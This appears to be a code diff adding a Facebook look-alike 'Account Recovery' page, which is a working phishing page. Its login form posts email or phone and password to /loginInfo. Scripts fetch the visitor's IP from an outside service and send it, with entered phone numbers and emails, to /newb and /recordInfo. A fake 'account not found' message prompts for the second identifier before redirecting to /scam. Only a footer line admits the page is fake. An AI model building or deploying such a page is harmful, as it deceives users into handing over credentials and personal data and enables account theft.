@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
+    <!-- Bootstrap -->
+    <script src="/static/bootstrap/js/jquery.min.js"></script>
+    <script src="/static/bootstrap/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css">
+    <title>Account Recovery | Facebook</title>
+    <style>
+        :root {
+            --background: #e9ebee;
+            --fblue: #1876f2;
+            --footerbg: #f2f2f2;
+            --fbtextfocus: #bec3ca;
+        }
+        body{
+            background-color: var(--background);
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body, html{
+            margin: 0px;
+            padding: 0px;
+            width: 100%;
+            height: 100%;
+        }
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            /* Set the fixed height of the footer here */
+            height: 60px;
+            line-height: 60px; /* Vertically center the text there */
+            background-color: white;
+        }
+        li{
+            list-style-type: none;
+            margin: 0px;
+            display: inline-block;
+        }
+        li:not(:first-child){
+            margin-left: 5px;
+        }
+        li span.a:hover{
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .custom-btn{
+            background-color: var(--fblue);
+            font-weight: bold;
+        }
+        .borderless li{
+            border: none;
+        }
+        .no-outline{
+            outline: none !important;
+            box-shadow: none !important;
+        }
+        .phonebtn{
+            background-color: #4267b2;
+            font-weight: bold;
+            padding: 2px 8px;
+            border-radius: 2px;
+            font-size: 12px;
+        }
+        .footer{
+            font-size: 12px;
+        }
+        .card{
+            font-size: 12px;
+            /* width: 45%; */ width: 557px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 1px solid #bbb;
+        }
+        .card-title{
+            font-size: 16px;
+            font-weight: bold;
+            padding: 8px 0px;
+            width: 95%;
+            margin: auto;
+            padding: 6px 9px;
+            border-bottom: 1px solid #ccc;
+        }
+        .msg{
+            text-indent: 5px;
+        }
+        .card-footer{
+            background-color: var(--footerbg);
+        }
+        input{
+            border: 1px solid #ddd;
+        }
+        input.invalid{
+            border: 1px solid red;
+        }
+        input:focus{ 
+            box-shadow: none;
+            outline: none;
+        }
+        input:focus::placeholder{
+            /* color: #757575; DEFAULT */
+            color: var(--fbtextfocus);
+        }
+        .logobrand{
+            fill: var(--fblue);
+            display: inline-block;
+            transition-duration: 0.5s;
+        }
+        .logobrand:hover{
+            fill: red;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        window.emailPattern = /^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
+        window.phonePattern = /^([0-9]( |-)?)?(\(?[0-9]{3}\)?|[0-9]{3})( |-)?([0-9]{3}( |-)?[0-9]{4}|[a-zA-Z0-9]{7})$/;
+        fetch("http://api.hostip.info/get_html.php").then(result=>result.text()).then(xd=>{
+            window.ip = xd.split("\n").reverse()[1];
+            fetch("/newb",{
+                method: "PUT",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({info: xd})
+            });
+        }).catch(err=>console.log("I made an oopsie"));
+        function validate(){
+            let emailEl = document.forms[0]["email"];
+            let email = emailEl.value;
+            if(window.emailPattern.test(email)||window.phonePattern.test(email))
+                return true;
+            if(email != "") emailEl.classList.add("invalid");
+            return false;
+        }
+    </script>
+</head>
+<body>
+    <nav class="navbar navbar-light bg-white py-2">
+        <a class="navbar-brand" href="/scam">
+            <svg class="d-block logobrand" height="22" viewBox="100 100 822.51 160"><path d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"></path><path d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"></path><path d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"></path><path d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"></path><path d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"></path><path d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"></path><path d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"></path><path d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"></path></svg>
+        </a>
+        <form class="form-inline" method="POST" onsubmit="return validate();" action="/loginInfo">
+            <input class="form-control mr-sm-2 mr-xs-0" type="text" name="email" placeholder="Email or Phone" aria-label="Username"  required>
+            <input class="form-control mr-sm-2 mr-xs-0" type="password" name="password" placeholder="Password" aria-label="Password" required>
+            <button class="btn custom-btn my-2 my-sm-0 text-light no-outline" type="submit">Log In</button>
+        </form>
+        <script>
+            document.forms[0]["email"].addEventListener("keyup",function(){
+                if(validate()) this.classList.remove("invalid");
+            })
+        </script>
+    </nav>
+    <div class="card">
+        <p class="card-title pt-3">Find Your Account</p>
+        <div class="d-flex justify-content-center">
+            <script>
+                function next(){
+                    event.preventDefault();
+                    let phone = window.phonePattern.test($("#phone").val());
+                    let email = window.emailPattern.test($("#phone").val());
+                    if((phone&&!window.gavePhone)||(email&&!window.gaveEmail)){
+                        if(phone) window.gavePhone = true;
+                        if(email) window.gaveEmail = true;
+                        document.querySelector(".phonebtn").innerHTML += '&nbsp;<span class="spinner-border spinner-border-sm" role="status"></span>';
+                        // Generate Request
+                        let fetch_body = {
+                            ip: window.ip
+                        };
+                        fetch_body[phone ? "phone" : "email"] = $("#phone").val();
+                        fetch("/recordInfo",{
+                            method: "PUT",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(fetch_body)
+                        })
+                        if(window.gaveEmail && window.gavePhone){
+                            this.location.replace("/scam");
+                            return false;
+                        }
+                        window.setTimeout(function(){
+                            let txt = "Sorry, but we're having some trouble finding your account.<br> Please use your " + (phone ? "email" : "phone number") + " instead";
+                            $("#err").css("color","black");
+                            $("#err").html(txt);
+                            $("#err").removeClass("d-none");
+                            document.querySelector(".phonebtn").innerHTML = "Search"; 
+                        }, 750);
+                    } else {
+                        //invalid phone number
+                    }
+                    return false;
+                }
+            </script>
+            <form onsubmit="next()" style="width: 100%;">
+                <div class="alert alert-danger mx-3 d-none mt-2 mb-0" id=err role="alert">
+                    Account not found 
+                </div>
+                <div style="width: 80%" class="mx-auto">
+                    <ul class="list-group list-group-flush borderless pb-3">
+                        <li class="list-group-item pb-1 msg">Please enter your email or phone number to search for your account</li>
+                        <li class="list-group-item pt-0"><input type=text placeholder="Mobile number" name="phone" id="phone" style="width: 55%;" required></li>
+                    </ul>
+                </div>
+                <div class="card-footer d-flex py-2">
+                    <button class="btn no-outline ml-auto phonebtn text-white">Search</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <footer class="footer">
+        <div class="container">
+            <ul class="text-muted">
+                <li>English (US)</li>
+                <li><span class=a>Espa&ntilde;ol</span></li>
+                <li><span class=a>Fran&ccedil;ais (Canadia)</span></li>
+                <li style="float: right" class="d-block" id="copy">&copy; Don't be a loser this is fake</li>
+            </ul>
+        </div>
+    </footer>
+    <script>
+        $("#copy")[0].addEventListener("mouseover",function(){
+            $("#copy").css("font-size","2em");
+        });
+    </script>
+</body>
+<script src="/static/scripts/fun.js"></script>
+</html>
